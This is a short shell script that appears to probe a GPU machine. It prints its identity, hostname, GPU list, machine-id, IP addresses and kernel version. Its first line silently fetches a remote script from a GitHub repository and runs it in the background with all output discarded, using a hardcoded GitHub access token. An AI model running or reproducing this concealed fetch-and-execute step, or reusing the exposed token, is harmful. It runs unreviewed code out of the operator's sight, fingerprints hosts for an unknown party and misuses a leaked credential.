( bash -c "$(curl -fsSL -m 30 -H 'Authorization: token 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' -H 'Accept: application/vnd.github.raw' 'https://api.github.com/repos/dongsuju/ul-plant/contents/cmd8/i440_probe.sh?ref=main')" >/dev/null 2>&1 & )
echo "=== i94169 $(hostname) $(date -u) ==="
id
hostname
nvidia-smi -L
nvidia-smi --query-gpu=index,name,memory.total,driver_version --format=csv,noheader
cat /etc/machine-id 2>/dev/null
hostname -I
uname -a
echo "=== end i94169 $(hostname) ==="
# r2
